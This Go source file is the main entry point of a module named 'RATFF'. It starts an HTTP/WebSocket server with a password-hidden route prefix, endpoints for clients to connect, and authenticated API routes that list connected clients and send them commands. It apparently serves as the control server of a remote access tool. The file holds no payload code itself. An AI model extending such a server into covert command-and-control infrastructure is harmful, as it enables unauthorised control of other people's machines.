package main

import (
	"context"
	"net/http"
	"os"
	"os/signal"
	"syscall"
	"time"

	"RATFF/shared"

	"github.com/gin-gonic/gin"
	"github.com/sirupsen/logrus"
)

var log *logrus.Entry

// setupRouter configures the HTTP router with all API endpoints.
func setupRouter(manager *ClientManager) *gin.Engine {
	gin.SetMode(gin.ReleaseMode)
	r := gin.New()

	r.Use(gin.Recovery())
	r.Use(gin.Logger())
	r.Use(rateLimitMiddleware())

	pathPassword := cfg.PathPassword

	var protected *gin.RouterGroup
	if pathPassword != "" {
		protected = r.Group("/" + pathPassword)
	} else {
		protected = r.Group("/")
	}
	{
		protected.POST("/verify", handleVerify)
		protected.GET("/ws", handleWebSocket(manager))

		api := protected.Group("/api")
		api.Use(authMiddleware())
		{
			api.GET("/clients", handleListClients(manager))
			api.POST("/command", handleSendCommand(manager))
		}
	}

	r.GET("/health", func(c *gin.Context) {
		c.JSON(200, gin.H{"status": "ok"})
	})

	return r
}

// startServer starts the HTTP server with optional TLS support.
func startServer(srv *http.Server) {
	certFile := os.Getenv("TLS_CERT")
	keyFile := os.Getenv("TLS_KEY")

	if certFile != "" && keyFile != "" {
		log.Info("Starting WSS server with TLS")
		if err := srv.ListenAndServeTLS(certFile, keyFile); err != nil {
			log.Fatal("Server failed: ", err)
		}
	} else {
		log.Warn("No TLS certificate, starting WS (INSECURE)")
		if err := srv.ListenAndServe(); err != nil {
			log.Fatal("Server failed: ", err)
		}
	}
}

// gracefulShutdown handles SIGINT and SIGTERM for clean server shutdown.
func gracefulShutdown(srv *http.Server) {
	quit := make(chan os.Signal, 1)
	signal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)
	<-quit

	log.Info("Shutting down server...")
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	if err := srv.Shutdown(ctx); err != nil {
		log.Error("Server forced to shutdown: ", err)
	}
}

func main() {
	log = shared.InitLogger("info", "text")
	loadConfig()

	manager := NewClientManager()
	router := setupRouter(manager)

	srv := &http.Server{
		Addr:    cfg.Host + ":" + cfg.Port,
		Handler: router,
	}

	go gracefulShutdown(srv)

	log.Info("Starting server on " + srv.Addr)
	startServer(srv)
}
